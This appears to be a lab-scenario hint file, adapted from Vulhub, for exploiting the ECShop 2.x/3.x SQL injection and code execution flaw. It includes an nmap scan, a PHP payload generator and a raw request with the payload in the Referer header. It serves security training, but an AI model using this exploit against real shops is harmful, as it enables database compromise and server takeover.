@@ -1,0 +1,144 @@
+# Optional ScenarioForge guide hints; derived from the adjacent public Vulhub documentation.
+schema_version: 1
+match: ecshop/xianzhi-2017-02-82239600
+hint_levels:
+  low:
+  - Inspect the ecshop service or application on {{NODE_NAME}} @ {{NODE_IP}}.
+  medium:
+  - |-
+    Catalog TCP ports: 8080,8081. Identify the exposed services:
+
+    ```bash
+    nmap -Pn -sT -sV -p 8080,8081 {{NODE_IP}}
+    ```
+  - 'Catalog port mappings (published → container): ecshop27: 8080/tcp → container 80/tcp; ecshop36: 8081/tcp →
+    container 80/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.'
+  - 'Documented target URL(s): `http://{{NODE_IP}}:8080`, `http://{{NODE_IP}}:8081`.'
+  high:
+  - 'Vulnerability: ECShop 2.x/3.x SQL Injection / Remote Code Execution Vulnerability.'
+  - Send the raw request examples with an HTTP client that recalculates Content-Length after target and payload
+    substitutions.
+  - |-
+    Exploit
+
+    There is a script that can generate POC for 2.x and 3.x:
+
+    ```php
+    <?php
+    $shell = bin2hex("{\$asd'];phpinfo\t();//}xxx");
+    $id = "-1' UNION/*";
+    $arr = [
+        "num" => sprintf('*/SELECT 1,0x%s,2,4,5,6,7,8,0x%s,10-- -', bin2hex($id), $shell),
+        "id" => $id
+    ];
+
+    $s = serialize($arr);
+
+    $hash3 = '45ea207d7a2b68c49582d2d22adf953a';
+    $hash2 = '554fcae493e564ee0dc75bdf2ebf94ca';
+
+    echo "POC for ECShop 2.x: \n";
+    echo "{$hash2}ads|{$s}{$hash2}";
+    echo "\n\nPOC for ECShop 3.x: \n";
+    echo "{$hash3}ads|{$s}{$hash3}";
+    ```
+
+    Put POC in the HTTP-Referer:
+
+    ```
+    GET /user.php?act=login HTTP/1.1
+    Host: {{NODE_IP}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+    Cookie: PHPSESSID=9odrkfn7munb3vfksdhldob2d0; ECS_ID=1255e244738135e418b742b1c9a60f5486aa4559; ECS[visit_times]=1
+    Referer: 45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:"num";s:107:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1' UNION/*";}45ea207d7a2b68c49582d2d22adf953a
+    Connection: close
+    Upgrade-Insecure-Requests: 1
+    Cache-Control: max-age=0
+
+
+    ```
+
+    Result of 2.x:
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/ecshop/xianzhi-2017-02-82239600/1.png
+
+    Result of 3.x:
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/ecshop/xianzhi-2017-02-82239600/2.png
+  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/ecshop/xianzhi-2017-02-82239600/README.md'
+  - |-
+    Additional public references:
+    - https://paper.seebug.org/691/
+access_instructions:
+  title: ECShop 2.x/3.x SQL Injection / Remote Code Execution Vulnerability
+  steps:
+  - title: Locate the target service
+    instructions: |-
+      Catalog TCP ports: 8080,8081. Identify the exposed services:
+
+      ```bash
+      nmap -Pn -sT -sV -p 8080,8081 {{NODE_IP}}
+      ```
+
+      Catalog port mappings (published → container): ecshop27: 8080/tcp → container 80/tcp; ecshop36: 8081/tcp → container 80/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.
+
+      Documented target URL(s): `http://{{NODE_IP}}:8080`, `http://{{NODE_IP}}:8081`.
+  - title: Exploit
+    instructions: |-
+      There is a script that can generate POC for 2.x and 3.x:
+
+      ```php
+      <?php
+      $shell = bin2hex("{\$asd'];phpinfo\t();//}xxx");
+      $id = "-1' UNION/*";
+      $arr = [
+          "num" => sprintf('*/SELECT 1,0x%s,2,4,5,6,7,8,0x%s,10-- -', bin2hex($id), $shell),
+          "id" => $id
+      ];
+
+      $s = serialize($arr);
+
+      $hash3 = '45ea207d7a2b68c49582d2d22adf953a';
+      $hash2 = '554fcae493e564ee0dc75bdf2ebf94ca';
+
+      echo "POC for ECShop 2.x: \n";
+      echo "{$hash2}ads|{$s}{$hash2}";
+      echo "\n\nPOC for ECShop 3.x: \n";
+      echo "{$hash3}ads|{$s}{$hash3}";
+      ```
+
+      Put POC in the HTTP-Referer:
+
+      ```
+      GET /user.php?act=login HTTP/1.1
+      Host: {{NODE_IP}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+      Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+      Cookie: PHPSESSID=9odrkfn7munb3vfksdhldob2d0; ECS_ID=1255e244738135e418b742b1c9a60f5486aa4559; ECS[visit_times]=1
+      Referer: 45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:"num";s:107:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1' UNION/*";}45ea207d7a2b68c49582d2d22adf953a
+      Connection: close
+      Upgrade-Insecure-Requests: 1
+      Cache-Control: max-age=0
+
+
+      ```
+
+      Result of 2.x:
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/ecshop/xianzhi-2017-02-82239600/1.png
+
+      Result of 3.x:
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/ecshop/xianzhi-2017-02-82239600/2.png
+guidance_source:
+  repository: https://github.com/vulhub/vulhub
+  snapshot_commit: 3af973a39bd0988f288a53fa9ea4b82372774e58
+  documentation_url: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/ecshop/xianzhi-2017-02-82239600/README.md
+  readme_sha256: 01ed4a674975dab3ead7bbd8af004552f48741ef64b948aeed6c2adb3326c161
+  compose_sha256: 6c76229b35d8949d0ab2fb5b3b54ff34541f84e669863e02ebc77e46d3d622bb
+  license: MIT; see vulnhub/content/LICENSE
+  method: Tiered discovery hints and adapted reproduction text from the local catalog snapshot. Reproduction commands
+    have not been executed.
